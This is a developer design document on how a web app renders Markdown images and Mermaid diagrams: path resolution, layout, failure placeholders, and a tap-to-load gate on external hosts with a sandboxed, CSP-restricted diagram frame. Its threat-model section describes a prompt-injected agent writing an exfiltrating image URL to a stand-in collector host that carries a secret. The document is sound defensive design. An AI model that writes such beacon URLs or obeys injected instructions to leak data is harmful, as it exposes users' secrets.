# Markdown images

How an image written in Markdown (`![alt](src "title")`) looks and behaves
wherever `MarkdownContent` renders it: chat messages, work items and comments,
agent roles, and a `.md` file rendered in Files or in the transcript.

The aim is that a Markdown image is not a second kind of image. It is read the
way every other image here is read, it fails the way they fail, and a tap opens
it in the [media viewer](media-viewer.md) the way an attachment thumbnail does.
What *is* particular to Markdown is that the image sits in flowing text that a
person or an agent wrote, so its size and its placeholders are set for prose,
not for a strip or a page of their own.

## Key Files

| Path | Role |
|------|------|
| `web/src/utils/markdownImage.ts` | `resolveMarkdownImage` (what a `src` names), `markdownFileBaseDir` (a `.md` file's base), `rehypeMarkdownImages` (block or inline, inside a link) |
| `web/src/components/ui/MarkdownImage.tsx` | The image: reading, shapes, placeholders, failures, the viewer; the held external image and the page-lifetime record of external URLs already requested |
| `web/src/components/ui/MermaidDiagram.tsx` | A Mermaid block, drawn in a sealed frame; offers to load the images the frame was refused |
| `web/src/lib/mermaidFrame.ts` | The frame's document and policy, and the messages it and the page exchange |
| `web/src/lib/mermaidSource.ts` | Mermaid's self-contained build, loaded once by the page and handed to each frame |
| `web/src/components/ui/MarkdownContent.tsx` | Takes the host's `baseDir` and `onOpenFile`; owns the hosts the reader has allowed in this text; lets an image's `src` through to the resolver unchanged; its link lets a held image inside it take the first activation |
| `web/src/components/ui/FileContentDisplay.tsx` | Passes a rendered `.md` file's own directory as the base, and its host's `onOpenFile` |
| `web/src/lib/fullScreen.ts` | The `markdown` content keeps a `.md` file's path and `onOpenFile`, for its slice in the transcript and its full-screen view |

## Where the bytes come from

What the `src` says decides the source, before anything is drawn:

| `src` | Source | Read |
|-------|--------|------|
| A relative path (`shots/a.png`, `./img/x.png`, `../logo.svg`) | The workspace file at that path, resolved against the base directory the host passes | Through the image pipeline: `file.get` for the description, then `useImageSrc` — lazy, authenticated, cached |
| An absolute path under the work directory (`/home/…/repo/shots/a.png`) | That workspace file (`relativeToWorkDir`) | As above |
| Any other absolute path (`/tmp/a.png`) | None — outside the work directory | Nothing is read |
| `http:` / `https:`, and `//host/…` as `https:` | The external URL | Nothing until the reader allows its host ([below](#external-requests-wait-for-the-reader)); then by the browser's `<img>`, `loading="lazy"`, `referrerPolicy="no-referrer"` |
| Any other scheme (`data:`, `javascript:`, `file:`, `mailto:`, …) | None — dropped | Nothing is read |

The base directory is the work directory's root for chat and work items, and
the Markdown file's own directory wherever a `.md` file's contents are rendered
(`FileContentDisplay`: the Files tab, a file at a commit, and a file the
transcript shows an agent read or write — whole, sliced, or full screen,
the last two through the `markdown` content's `filePath`,
[below](#open-in-files-from-a-rendered-md)). The transcript names that file by its
absolute path; one outside the work directory has no base, so its relative
images are outside too. A
path's `?query` and `#fragment` are dropped and its percent-escapes decoded
before it is resolved, so `my%20shot.png` and `<my shot.png>` name the same
file.

HTML pages get project files another way, by URL from a [raw
capability](code/authentication.md#raw-capabilities-urls-a-browser-element-loads-by-itself)
rather than through this pipeline, but from the same places: an `.html` file
resolves against its own path ([file.md](file.md#html-pages)), and an
`html_render` page against the root of the worktree, an absolute path under the
work directory included ([tool-call-ui.md](tool-call-ui.md#project-files)).

Absolute paths are here because an agent names the file it just wrote by its
full path as often as by a relative one, and the transcript must show both. A
path outside the work directory is not read even when the server could reach
it: the workspace is what the app shows, and saying so is clearer than a "not
found" for a file that exists. A README's site-root path (`/docs/a.png`, which
GitHub reads from the repository root) is therefore not resolved; on a machine
it is indistinguishable from a real absolute path.

Both readable kinds wait until the image is on screen (`useInView`, the
thumbnails' rule): a transcript paged back puts every image the session ever
wrote into the DOM, and reading them all spends the connection on pictures
nobody looked at. An external image's `src` is held back the same way rather
than left to `loading="lazy"`, whose reach ahead is the browser's to choose.

## Block or inline

A Markdown image has two shapes, decided from where it stands in the text:

- **Block** — the image is alone on its line: nothing but whitespace or a line
  break between it and the start and end of the line, within a paragraph or a
  list item.
  This is how an agent shows a screenshot (`Screenshot:` ⏎ `![](shot.png)`; with
  `remark-breaks` that is one paragraph with a `<br>`, and it is still a block).
  The `<br>` *after* a block image is dropped: the image is a box of its own, so
  the next line starts under it anyway, and a break leading that line would
  draw an empty one.
- **Inline** — anything else: the image shares its line with text or with other
  images, or stands in a table cell or a heading. In practice that is a README's
  row of badges, a badge table, a logo in a title, or an icon in a sentence.
  Table cells and headings are always inline because they are where a README
  puts small images, and a framed 12rem placeholder per cell would wreck the
  table.

The shape is fixed by the Markdown, not by the image once it loads, so it is
known on the first frame and does not change when the bytes arrive. It can
change while an agent is still writing the line the image is on — text arriving
after an image on its line turns it inline — which is the same reflow any
streamed text causes, and stops when the line does.

### Block

- **Size.** Laid out at its natural size, one image pixel to one CSS pixel,
  shrunk (never enlarged) to fit inside the column's width and a height cap:
  **20rem**, **24rem** from `sm` up. Aspect is always kept: nothing is cropped
  or letterboxed, and the frame wraps the image exactly. A small icon on its own
  line stays small.

  The cap is between the strip's thumbnail (96 / 128px — a glance) and the Files
  preview (70vh — the page): the author put the picture into the prose on
  purpose, so it is shown at a size worth reading, but a phone-screenshot of
  2532px cannot be allowed to push the rest of the message off the screen. The
  viewer is where it is read at full size.
- **Placement.** Left-aligned with the text, on its own line, with the
  paragraph's own spacing above and below (Typography's `img` margin is not
  used).
- **Frame.** `rounded-lg`, `border-th-border`, `bg-th-bg-secondary` — the
  attachment thumbnail's frame, so a transparent PNG is legible in both themes
  and a white screenshot does not bleed into a light page.
- **While loading** — through both reads, the description and then the bytes —
  a `Skeleton` box, full column width, `--async-media-height`
  (12rem) tall, rounded like the frame. On load the box takes the image's fitted
  size. That is a resize, which the transcript's scroll invariant absorbs
  (`useTranscriptScroll`, see the `ASYNC MEDIA` note in `src/index.css`); 12rem
  is what a wide screenshot fits to on a phone, so the common case barely moves.
  A fixed-height frame would never move, but it left a tall band of empty space
  beside every image smaller than it; that is what this used to be.

### Inline

- **Size.** Natural size, capped at the column's width and at **2em** high, and
  `vertical-align: middle` so it sits on the line like a glyph. A shields.io
  badge (20px) is drawn as written; a screenshot written mid-sentence becomes a
  thumbnail the height of two lines, which the viewer opens at full size.
- **No frame.** Badges and icons are designed to be drawn bare; a border round
  each one in a badge row would read as a row of buttons.
- **While loading.** A `Skeleton` of 1em × 3em, inline, so a badge row does not
  arrive as one collapsed line and then spread out.

## Failure, and what is not an image

Nothing ever falls back to the browser's broken-image icon. What stands in is
sized to the shape it replaces.

### Block: a chip

A block image that could not be shown is drawn as the chip the attachment strip
uses for the same thing (`AttachmentChip`, ImageOff icon) — the weight of a line,
not `ImageFailureCard`'s page-sized empty state, which is written for a screen
with nothing else on it.

| Case | Icon | Title | Detail | Action |
|------|------|-------|--------|--------|
| Workspace read failed (not found, network) | ImageOff, error colour | the label (below) | the server's message, else `Couldn't load image` | Retry |
| Absolute path outside the work directory | ImageOff, muted | label | `Outside the work directory` | none |
| Bytes read but would not decode | ImageOff, error colour | label | `Image can't be displayed` | Retry (remount only) |
| The path names a file that is not an image (text, too large, binary), or a directory | ImageOff, muted | label | the omission's label, else `Can't be previewed` — the strip's words | none |
| External image failed | ImageOff, error colour | label | `Couldn't load image · <host>` | Retry (remount) |
| Unsupported scheme | ImageOff, muted | label | `Not shown: unsupported address` | none |

The chip's tooltip is the full `src`, so a wrong path an agent wrote can be read
in full. The label is the alt text when there is one, else the file name — the
last segment of the path or URL.

An external image's `onError` says nothing about why, so its detail names only
the host: that alone tells the reader the failure is somewhere else's, not the
workspace's.

### Inline: the alt text

An inline image that fails, or is dropped, is replaced in the line by its alt
text in muted colour after a small ImageOff icon (`size-[1em]`). Its tooltip is
the chip's, with the chip's detail on a second line — the one place an inline
failure says why. A failed badge then still says what it was
(`build passing`), and the line keeps its reading order. No Retry: an inline
action in a sentence is a mis-tap waiting to happen; the block form has it.

With no alt text the label is the file name, as for the chip. A dropped image is
never silent ([AGENTS.md](../AGENTS.md#error-handling)): it is visible, just
small.

## External requests wait for the reader

**Nothing an agent writes reaches another host until the reader asks for it.**
This section is where that rule is stated; the places that apply it link here.

The reason is the agent. Everything the app draws may be something an agent
wrote, and an agent that has read something hostile (a web page, an issue, a
dependency's README) can be told to put what it knows into a URL:
`![](https://collector.example/p.png?k=<secret>)`. Drawing the content is the
request, and the request is the leak; it passes through no permission prompt,
because drawing a message or opening a file is not a tool call. The one thing
an agent cannot write for itself is the reader's tap, so that is the gate.

It is applied in three places, each where that kind of content is drawn:

| Content | Held back by | Until the reader |
|---|---|---|
| A Markdown image | Not being requested: a placeholder names the host ([below](#the-placeholder)) | taps Load, for that host in that text |
| A Mermaid diagram | A sealed frame whose policy refuses every host ([below](#diagrams-draw-in-a-sealed-frame)) | taps Load under it, for its images' hosts |
| An HTML page — an `html_render` card, an `.html` file in Files, a commit or the media viewer | A policy that refuses every host, and a wrapper that keeps the page from navigating out ([page-external-hosts-ui.md](page-external-hosts-ui.md)) | taps Load in the strip above it, for those hosts on that page |

What the three share, and do not restate:

- **The reader judges a host,** shown by name, never cut short, and never the
  full URL ([why](#not-in-this-design)).
- **An allowance is for this content,** never the host everywhere
  ([what a tap allows](#what-a-tap-allows)), in memory only and never
  persisted.
- **Where code runs, the guarantee is the browser's**, not a reading of the
  source: a diagram or a page is drawn in a document whose
  Content-Security-Policy refuses what was not allowed, and the reader is
  offered only from what it refused. There the app's own host is never
  offered, on any port: a request from that document could carry the app's
  cookies, which are not kept apart by port.
- **No setting turns it off** ([not in this design](#not-in-this-design)).

What follows is how Markdown images and diagrams apply it.

A link is the same URL with no request in it, but a page served over plain
`http` (a LAN address) has the browser resolve the host of every link on it
ahead of a tap — and a hostname can carry a secret as well as a path can. So
`index.html` turns that DNS prefetching off for the whole app.

### Which surfaces hold

All of them: chat (the agent's text, thinking, plans, task reports, questions,
`WebFetch` results), work items, comments and agent roles, and `.md` files
rendered by `FileContentDisplay` — the Files tab, a file at a commit, and the
transcript's reads and writes — and the Mermaid diagrams in any of them
([below](#diagrams-draw-in-a-sealed-frame)). HTML pages hold too, on every
surface that draws one ([page-external-hosts-ui.md](page-external-hosts-ui.md)).
So `MarkdownContent` takes no
policy prop: there is one rule, and a surface added later is held without
having to remember to ask for it.

None of them is text only the user wrote. Work items, comments and agent roles
are written through the agent's own tools as often as by hand. A `.md` file in
the workspace is the hardest case and holds for the same reason: in an app built
on the agent doing the editing, a file being in the workspace says nothing about
who wrote it, and an agent that wrote a beacon into `notes.md` needs only to
say "open notes.md". Opening a file is the reader choosing to read it, not
choosing to contact every host it names. The cost lands on READMEs, whose badges
arrive as placeholders; one tap per host clears a badge row (below), which is
the price of the rule having no exceptions to get wrong. The user's own chat
messages are plain text, not Markdown, so they never reach this code.

### The placeholder

It sits where the image would and is sized for its shape, like a failure — but
it is an offer, not an error, so it uses the `Image` icon in muted colour, never
`ImageOff` or the error colour. Its words follow the failure's
(`Couldn't load image · <host>`): the host, lowercased as `URL.host` gives it,
is what the reader is being asked to trust, so it is always visible, in both
shapes — wrapped rather than cut short, since its owner is its last part and an
ellipsis there would show `img.shields.io.…` for any host that starts that way.
The tooltip is the full `src`, as for every placeholder here.

- **Block** — the failure's `AttachmentChip`: icon `Image`, title the label,
  detail `Not loaded · <host>`, action **Load**. Load's accessible name is
  `Load <label> from <host>`: a message with two placeholders would otherwise
  offer two buttons both named "Load". The chip's action already meets the
  hit-area floor (36px fine, 44px coarse); it gains the shared focus ring
  (`focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-th-accent`),
  which Retry gets too. No skeleton: nothing is loading.
- **Inline** — a button drawn as a small outlined pill that sits on the line:
  `inline-flex max-w-full items-center gap-1 rounded border border-th-border
  px-1 align-middle text-[0.875em] leading-tight`, the `Image` icon at
  `size-[1em]`, then the label (`text-th-text-primary`, truncated at `12em`),
  then `· <host>` in `text-th-text-muted`. It carries `touch-target`, since a
  line's height cannot grow, the focus ring above, `hover:bg-th-overlay-hover`
  and the same accessible name as the block's Load. A held badge row then reads
  `build passing · img.shields.io` ×N and wraps; it is the held state, not the
  page's resting look, and one tap ends it.

The inline failure offers no action, to keep mis-taps out of sentences. Here
the action is the only way an inline image can ever appear, so it is offered;
a mis-tap costs one image from a host the reader can see named on the thing
they tapped.

**Inside a link** (`[![badge](https://img.shields.io/…)](https://ci…)`, every
README badge) a button would nest in the `<a>`, which HTML forbids. The
placeholder is drawn the same but as plain spans with no button, marked
`data-held-image-host="<host>"`, and the link is the control: `MarkdownContent`
renders `a` through a small `MarkdownLink` whose `onClick` looks for that mark
inside itself and, while one is there, prevents the navigation and allows those
hosts instead. Keyboard activation of an `<a>` is a click on the `<a>`, so Enter
does the same. A screen reader hears it from an `sr-only` sentence inside the
placeholder — `Image not loaded; activating the link loads it first.` Once the
image is there, the link follows on the next tap as before. The block chip
inside a link has no action button, for the same reason.

### What a tap allows

- **The host, for this text.** Load allows the host in that `MarkdownContent`:
  every held image from that host in the same text loads, including ones that
  stream in later — `MarkdownContent` owns the set, so a message still being
  written keeps it across re-renders. Another host in the same text still needs
  its own tap. This is what makes a README's badge row one tap rather than one
  per badge. Asking per image would ask the same question again with nothing
  new to judge: what a reader can weigh is the host — the rest of the URL is a
  tooltip a phone never shows, and reads the same for a CDN and a beacon — and
  every image from that host here was written by the same author in the same
  text.
- **Not the host everywhere.** An allowance does not reach another message,
  another work item or another file. It holds while the text it was given in
  still starts what the `MarkdownContent` shows — so a message streaming in
  keeps it, and a host that swaps another file or work item into the same place
  without remounting does not pass it on; the rule is the component's, so no
  host has to remember a `key`. A host allowed everywhere would load anything
  an agent writes on it later without asking — and `img.shields.io`, the host
  most likely to be allowed, fetches arbitrary URLs for its endpoint badges, so
  it is a carrier for any other host. The gate is the reader's consent to this
  text, not an inspection of the host.

  What the rule cannot tell from streaming is a later edit that only adds to
  the end, and it does not try: the agent writes a streaming message as much as
  it writes an edit, so an allowance that covers what streams in after the tap
  covers that too. That is the price of a badge row being one tap while it is
  still being written.
- **The exact URL, for the page's lifetime.** An external URL that has been
  requested after a tap is remembered in memory (a module-level set in
  `MarkdownImage.tsx`), and an image with that exact URL starts loaded wherever
  it mounts: a collapsed tool row reopened, the Files tab left and come back to,
  the same text in a full-screen viewer. That host has already received exactly
  that request; asking again would guard nothing. Not persisted — a reload
  starts over, so nothing outlives the session in which the reader saw it.

Load hands its focus to the image that replaces it, so a keyboard or a screen
reader stays where it was rather than dropping to the top of the page (the
image's own View button is disabled until it loads); if the image then fails
while still holding it, the failure takes it. Once allowed, the image is
the external image described everywhere else in this document: held until on
screen, a skeleton, then the image; a failure is the
`Couldn't load image · <host>` chip, and its Retry does not ask again.

**Inside a `Sheet`** the placeholder works the same; only the loaded image's
viewer is absent, as for any image there. The placeholder never opens the
viewer: there is nothing to show yet.

The allowance travels in `MarkdownImageSettings` beside `baseDir` and
`onOpenFile`, so an image and a diagram read the same one. The link finds held
images through `heldImageHosts`, so the mark's name lives in `MarkdownImage.tsx`
alone.

### Diagrams draw in a sealed frame

A ```` ```mermaid ```` block is the same leak by another road: Mermaid fetches
what a diagram names itself — an `img:` node sets `new Image().src`, an HTML
label may hold an `<img>`, and `classDef`, `style` and `themeCSS` take CSS
`url()` and `@import`. None of it passes through `MarkdownImage`.

**Held back by the network, not by reading the source.** An earlier version
read the source for every URL Mermaid might fetch, through every encoding the
source can be written in and every layer — YAML, JSON, CSS escapes, entities,
DOMPurify, the URL parser — that rewrites a string on its way to a fetch. Each
review found another road it did not model, and a deny-list over a language
that rich can never be shown complete. So the guarantee moved to where it can
be stated: the diagram is drawn in a document that cannot make a request
unless the reader has allowed it.

**The frame** (`MermaidDiagram.tsx`, document and messages in
`lib/mermaidFrame.ts`):

- An `<iframe srcdoc>` with `sandbox="allow-scripts"` — no `allow-same-origin`,
  so the frame's origin is opaque: no `localStorage`, no cookies, nothing of the
  app's to read. Its `title` is `Mermaid diagram`.
- A Content-Security-Policy in the document itself:
  `default-src 'none'; script-src 'nonce-…'; style-src 'unsafe-inline'; img-src data:; base-uri 'none'; form-action 'none'`.
  Nothing is fetched — no stylesheet, `@import`, font, connection, frame or
  worker — and the only scripts are the frame's own, by a nonce made fresh for
  each diagram. Inline styles are allowed because Mermaid writes a `<style>` into
  every SVG; with no host in `style-src`, an `@import` there is refused.
- The frame fetches nothing from the app's server either, not even Mermaid,
  so no request from it can carry the app's cookies. The page imports
  Mermaid's self-contained build (`mermaid/dist/mermaid.min.js?raw`, one lazy
  chunk — `lib/mermaidSource.ts`) and posts its text to each frame, which runs it
  as a nonce'd script. That is the app's only copy of Mermaid: nothing in the
  page imports it, and the diagram is drawn only in the frame. The price is
  that the first diagram brings all of Mermaid rather than its own diagram
  type's chunk, and that every frame parses the script itself; the per-type
  chunks of the ESM build would have to be fetched, which is what the frame
  cannot do.
- The page and the frame speak over a `MessagePort`. The frame's first
  script hands one to the page in a `ready` window message carrying a token
  its document was written with, and the image hosts its policy allows. The
  page takes it only if the message's `source` is this diagram's frame, its
  `origin` is `"null"` (the opaque origin), and its token is the one the page
  wrote. Everything after goes over the port, in the shapes `readFrameMessage`
  knows. Origin and window alone would not be enough. If the frame were ever
  navigated, the page it landed on would be just as opaque and the same
  `contentWindow`, but it would have neither the token nor the port, so it can
  neither speak for the diagram nor receive Mermaid or the source. The token is
  not the CSP nonce: the nonce also stands in the policy's `<meta>`, an
  attribute a diagram's CSS could select on, and the token is only ever script
  text. Each load says `ready` again and is drawn afresh: one under a new
  policy, and one the browser reloads by itself because the frame moved in the
  DOM. A document counts as the diagram's only while the hosts it names are
  the ones the page now wants, so a late answer from the document a Load
  replaced is not taken for the new one.
- The page sends:
  - Mermaid's theme (`dark` or `default`, as before);
  - the `color-scheme`, because otherwise a frame whose scheme differs from
    the page's is painted opaque;
  - the page's font stack and `--th-text-primary`, for whatever Mermaid leaves
    unstyled.

  It sends them again whenever the root's classes change, so a theme switch
  redraws the diagram. The frame answers with the diagram's height whenever it
  changes, and the page sizes the frame to it. Mermaid's own font settings are
  untouched, so a diagram looks as it did: its own CSS names its fonts, and
  only `dark` or `default` reaches its colours, not the app's colour themes.
  Geist itself cannot load in the frame (`font-src` is none), which falls back
  along the stack.
- A frame is only created once the diagram is near the screen (`useInView`,
  the images' rule). Each frame runs its own Mermaid, and a transcript paged
  back would otherwise start one for every diagram in it.
- **Errors.** A render error shows the source as a code block, as before. So
  does a frame that has not said `ready` within ten seconds, which is a frame
  that cannot run at all; the source is not left on "Loading diagram..." for
  good. A frame that is not shown stays mounted but `inert` and hidden, so a
  diagram streaming out of an error draws without loading Mermaid again. Until
  the document now in the frame has drawn, the `.mermaid-placeholder` box holds
  the place — so a Load, which is a new document, shows it again for a moment.
- **Links.** A link in a diagram does not navigate the frame: an `<a>` or an
  image map's `<area>`, which DOMPurify keeps too. The frame reports the tap,
  and the page opens an `http(s)` link in a new tab with
  `noopener,noreferrer`, as a link in the text around it would be followed.
  The frame's document also turns DNS prefetching off.
- **Escape.** An Escape pressed in the frame never reaches the page. The frame
  reports it, and the page re-dispatches it from the `<iframe>` element, where
  the sheet or overlay it is meant to close is listening.

**External images.** A plain diagram draws at once, as before. When the
policy refuses an image, the frame's `securitypolicyviolation` event names the
URL the browser was about to fetch — the browser's own reading, not a guess
from the source — and the frame reports it. Under the diagram the page then
shows the block chip a held image uses: the `Image` icon, title
`Diagram images`, detail `Not loaded · <host>, <host>` (every refused host,
wrapped) and **Load**, named `Load diagram images from <hosts>`. The diagram is
drawn meanwhile, with those images missing.

Load allows those hosts in the same `MarkdownContent`, through the same
`allowHost` as an image's Load, and the frame is drawn again in a new document
whose `img-src` adds exactly those hosts (`http://` and `https://` of each — a
host is allowed regardless of scheme, as for an image). A policy cannot be
widened once a document has loaded, so allowing is a new document. A diagram
that streams in keeps its frame, unless a version of it matches a source drawn
earlier in the page with hosts allowed, which brings those hosts with it. The
allowance goes both ways, as one tap should: a diagram's Load also loads the
images from those hosts in that text, and a host an image's Load already allowed
is added to the diagram's policy as soon as the frame reports it refused — never
before, so a diagram's policy names only hosts it was found to need. The focus
moves to the diagram. The hosts a diagram was drawn with are remembered for its
source for the page's lifetime, as an image's URL is, so remounting it does not
ask again. What a frame was refused is held by the same rule as the allowance:
a diagram that streams in keeps it, and one swapped in at the same place does
not inherit the hosts its predecessor was refused.

Only images are offered. A refused stylesheet, font or connection stays
refused with no offer: none of them is something the reader would see as
missing, and allowing one would hand a diagram's CSS a road to any host. The
app's own host is never offered ([why](#external-requests-wait-for-the-reader)),
nor is anything but `http(s)`, nor a host a CSP source cannot name (an IPv6
literal, or a name with an `_`); such an image stays missing without a chip.

## Alt text and title

- **Alt** is the `<img>`'s `alt`, and the label: the open button's accessible
  name (`View <label>`), the viewer's title, and the failure chip's title. It
  is not drawn under a loaded image: in agent output it usually repeats the
  sentence before it.
- **Title** is the `<img>`'s `title`, so a fine pointer shows it on hover, as
  any Markdown renderer does. It is not a caption: the Markdown author who wants
  one writes it as text.
- Where alt is empty, the file name stands in for every use above.

## Opening the viewer

A loaded image, block or inline, is a button — the attachment thumbnail's
pattern, not `ImagePreview`'s corner ⤢ button: in prose the image is not the
page, so the image itself is the control, reachable by Tab like a link.

- `aria-haspopup="dialog"`, `aria-label="View <label>"`,
  `pointer-fine:cursor-zoom-in`, and the focus ring other buttons use
  (`focus-visible:ring-2 focus-visible:ring-th-accent`). No hover overlay or
  corner icon: it would sit on top of the content being read.
- The button carries `touch-target`: an inline image at 2em is under the
  hit-area floor ([responsive-ui.md](responsive-ui.md)), and so is a small icon
  alone on its line; on anything larger the overlay is the box itself. Two
  inline images side by side can then overlap their overlays; that is accepted,
  since a mis-tap opens the neighbour's viewer and costs one Back.
- Disabled while loading; on failure there is no button, since the chip or
  the inline label stands in (and the chip owns the Retry).
  A held external image has no viewer button either: its placeholder's Load is
  the control until the image is there.
- **An image inside a link** (`[![badge](b.svg)](https://ci…)`) is the link's
  content: a tap follows the link, as a reader of a README expects, and no
  viewer is offered — except that a held external image takes the first tap
  ([above](#the-placeholder)).
- **Inside a `Sheet`** (`useIsInSheet`) — today only the transcript's
  `FullScreenViewer` renders Markdown in one — the image is not a button: the
  viewer is a sheet, and sheets do not nest
  ([media-viewer.md](media-viewer.md#opening-it)). That surface is already full
  screen, so the loss is the zoom alone.
- The image owns its open state, as `ImagePreview` does, and renders the viewer
  outside its loading and failure branches. A message that is still streaming
  re-renders around it without closing it; if the image itself remounts the
  viewer closes, and a tap brings it back.

### What the viewer shows

| | Workspace image | External image |
|---|---|---|
| Title | label | label |
| Caption | `PNG · 2000×1333 · 433 KB`, as everywhere | `example.com · 2000×1333` — the host in place of type and size, which an `<img>` does not report |
| Save | yes | no — reading the bytes means a cross-origin `fetch`, which fails on every host that sends no CORS headers, most of them |
| Open in Files | yes, when the host can navigate (`MarkdownContent`'s `onOpenFile`: an agent's text in the chat, a `.md` file — [below](#open-in-files-from-a-rendered-md)) | no |
| Open original | no | yes: opens the URL in a new tab, `noopener noreferrer` |

That is where an external image is told apart. In the text it looks like any
other image: a badge on every external picture would be noise in a README, and
what the reader needs to know — that it came from somewhere else and cannot be
saved from here — matters only once they try to do something with it.

The viewer's image source therefore has an external kind beside `inline` and
`remote` (`utils/fileView.ts`), which the stage draws as a plain URL in an
`<img>` with `referrerPolicy="no-referrer"`.

### Open in Files from a rendered `.md`

A rendered `.md` file offers Open in Files too: `FileContentDisplay` takes an
optional `onOpenFile` and hands it to `MarkdownContent`. Its hosts, and what
they pass:

| Host | Where | `onOpenFile` |
|------|-------|--------------|
| `FileView` → `FileBody` | Files tab | Pushes a `file` overlay for the image (`overlayToNavigation`, as its Edit does), so Back returns to the `.md`. Pushed, not replaced: the reader went somewhere from the document and expects to come back to it. |
| `CommitFileView` → `FileBody` | A file as of a commit | The same push. The image it shows is the working tree's — a relative path is read through `file.get`, not from the commit — so the file it opens is the one on screen. |
| `ReadResultDisplay` (`ToolResultDisplay`) | Transcript: a file an agent read | `ToolResultDisplay`'s own `onOpenFile` |
| `ProposedChange` (`write`) in `PermissionRequestBody`, `TurnChangesCard`'s `EditSection`, `ToolResultDisplay` | Transcript: a file an agent asks to write or wrote | The surrounding `onOpenFile`; `EditSection` takes it from `TurnChangesCard`'s own `FileBody`, and keeps it for a deleted file, where `PathLine` drops it: the images it opens are other files |
| `ContentSlice` (`HugeContent`) | Transcript: the slice drawn of a `.md` read or written that is too large to draw whole | The `markdown` content's `onOpenFile` (below) |
| `FullScreenViewer` | The same `.md` full screen, inside a `Sheet` | none — the image is not a button there, so there is no viewer to offer it |
| `DiffContent` → `FileBody` | A diff | none — it reaches `FileBody` only for an omitted file, which renders no Markdown |

`FileBody` and `ProposedChange` take the optional
`onOpenFile?: (path: string) => void` only to pass it through; the path is
work-directory-relative, as every `onOpenFile` here takes it.

The `ContentSlice` and `FullScreenViewer` rows reach `FileContentDisplay` only
because the `markdown` content (`lib/fullScreen.ts`) keeps the file it came
from: without its path, both would render the text against the work
directory's root and its relative images would miss. So
that content carries `filePath?: string` — set by `fileFullScreenContent`,
absent for `WebFetch`, whose text lives in no file — and `onOpenFile?`, as the
`files` kind carries one. Both survive `sliceContent`. `ContentSlice` renders a
`markdown` with a `filePath` through `FileContentDisplay`, passing both;
`FullScreenViewer` does the same inside its reading width, passing no
`onOpenFile`. `fileFullScreenContent` and `changeFullScreenContent` take the
`onOpenFile` from their callers, which all have one in scope
(`resultFullScreenContent`, `PermissionRequestBody`, `EditSection`).

## Not in this design

- Swiping between the images of one message in the viewer (the viewer has no
  carousel; see [media-viewer.md](media-viewer.md#not-in-v1)).
- Video, HTML or other Markdown links to media.
- A setting to always load external images, or to trust a host everywhere.
  Either undoes the gate for every text at once, including the ones an agent has
  not written yet.
- Drawing diagrams in the app's own font and colour theme. That means setting
  Mermaid's `fontFamily` and `themeVariables` from the page, a change to how
  every diagram looks rather than to what it may fetch.
- Showing the full URL before loading. The tooltip carries it for a fine
  pointer; a host is what a reader can judge at a glance, and a query string of
  an exfiltrating URL looks like any CDN's.
